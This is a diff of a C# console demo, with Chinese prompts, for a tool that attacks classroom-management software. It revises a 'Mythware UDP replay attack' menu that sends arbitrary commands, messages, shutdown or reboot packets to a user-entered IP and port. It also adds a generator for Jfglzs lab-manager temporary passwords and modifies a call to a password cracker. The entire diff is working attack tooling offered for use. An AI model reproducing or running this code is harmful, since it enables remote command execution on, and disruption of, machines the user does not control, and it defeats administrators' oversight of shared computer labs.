@@ -101,7 +101,7 @@ namespace Demo
             {
                 Console.WriteLine("这会消耗特别长的时间（约为半分钟）, 且可能无效, 请耐心等待");
                 var password = T4CLLibrary.Jfglzs.PasswordCracker.GetEncryptedPassword();
-                var result = T4CLLibrary.Jfglzs.PasswordCracker.DecryptPassword(password);
+                var result = T4CLLibrary.Jfglzs.PasswordCracker.DecryptPassword(password,true);
                 if (result.Length == 0)
                 {
                     Console.WriteLine("解密失败");
@@ -113,6 +113,7 @@ namespace Demo
                         Console.WriteLine($"密码可能为:{pwd}");
                     }
                 }
+                Console.Write("\a");
             }
             else
             {
@@ -136,45 +137,73 @@ namespace Demo
 
         static void MythwareUdpAttack()
         {
-            Console.Clear();
-            Console.Write("请输入要攻击的IP地址:");
-            var ip = Console.ReadLine();
-            Console.Write("请输入要攻击的端口号:");
-            var port = Console.ReadLine();
-            Console.Write("攻击方式?(c: 发送命令, m: 发送信息, s: 关机, r: 重启): ");
-            var attackType = Console.ReadLine();
-            switch (attackType)
+            while (true)
             {
-                case "c":
-                    Console.Write("请输入要发送的命令:");
-                    var command = Console.ReadLine();
-                    T4CLLibrary.Mythware.UdpAttack.SendMessage(command,CommandType.ExecuteCommand,ip,int.Parse(port));
-                    Console.WriteLine("已发送");
+                Console.Clear();
+                Console.WriteLine("极域UDP重放攻击");
+                Console.Write("攻击方式?(c: 发送命令, m: 发送信息, s: 关机, r: 重启, q: 退出程序): ");
+                var attackType = Console.ReadLine();
+                if (attackType == "q")
                     break;
-                case "m":
-                    Console.WriteLine("请输入信息, 在最后一行按下Ctrl+Z后再按Enter结束:");
-                    var message = ReadUntilCtrlZ();
-                    T4CLLibrary.Mythware.UdpAttack.SendMessage(message, CommandType.SendMessage, ip, int.Parse(port));
-                    Console.WriteLine("已发送");
-                    break;
-                case "s":
-                    T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Shutdown, ip, int.Parse(port));
-                    Console.WriteLine("已发送");
-                    break;
-                case "r":
-                    T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Reboot, ip, int.Parse(port));
-                    Console.WriteLine("已发送");
-                    break;
-                default:
-                    break;
+                Console.Write("请输入要攻击的IP地址:");
+                var ip = Console.ReadLine();
+                Console.Write("请输入要攻击的端口号:");
+                var port = Console.ReadLine();
+                switch (attackType)
+                {
+                    case "c":
+                        Console.Write("请输入要发送的命令:");
+                        var command = Console.ReadLine();
+                        T4CLLibrary.Mythware.UdpAttack.SendMessage(command, CommandType.ExecuteCommand, ip, int.Parse(port));
+                        Console.WriteLine("已发送");
+                        break;
+                    case "m":
+                        Console.WriteLine("请输入信息, 在最后一行按下Ctrl+Z后再按Enter结束:");
+                        var message = ReadUntilCtrlZ();
+                        T4CLLibrary.Mythware.UdpAttack.SendMessage(message, CommandType.SendMessage, ip, int.Parse(port));
+                        Console.WriteLine("已发送");
+                        break;
+                    case "s":
+                        T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Shutdown, ip, int.Parse(port));
+                        Console.WriteLine("已发送");
+                        break;
+                    case "r":
+                        T4CLLibrary.Mythware.UdpAttack.SendMessage("", CommandType.Reboot, ip, int.Parse(port));
+                        Console.WriteLine("已发送");
+                        break;
+                    default:
+                        break;
+                }
             }
         }
+
+        static void GetJfglzsTempPassword()
+        {
+            Console.WriteLine("获取机房管理助手临时密码");
+            Console.Write("自动计算?(Y/N): ");
+            var auto = Console.ReadLine();
+            if (auto == "Y")
+            {
+                var tempPassword = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
+                Console.WriteLine($"临时密码为: {tempPassword}");
+            }
+            else
+            {
+                Console.Write("日期(格式: yyyy-MM-dd):");
+                var date = Console.ReadLine();
+                DateTime dt = DateTime.Parse(date);
+                var tempPassword = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword(dt.Month,dt.Day,dt.Year);
+                Console.WriteLine($"临时密码为: {tempPassword}");
+            }
+        }
+
         static void Main(string[] args)
         {
             try
             {
                 ShowTips();
                 var choice = Console.ReadLine();
+                Console.Clear();
                 switch (choice)
                 {
                     case "1":
@@ -209,8 +238,7 @@ namespace Demo
                         JfglzsPasswordCracker(useNewVer);
                         break;
                     case "9":
-                        var tempPassword = T4CLLibrary.Jfglzs.PasswordCracker.GenerateTemporaryPassword();
-                        Console.WriteLine($"生成的临时密码为: {tempPassword}");
+                        GetJfglzsTempPassword();
                         break;
                     case "10":
                         Console.Write("请输入要挂起的进程名:");
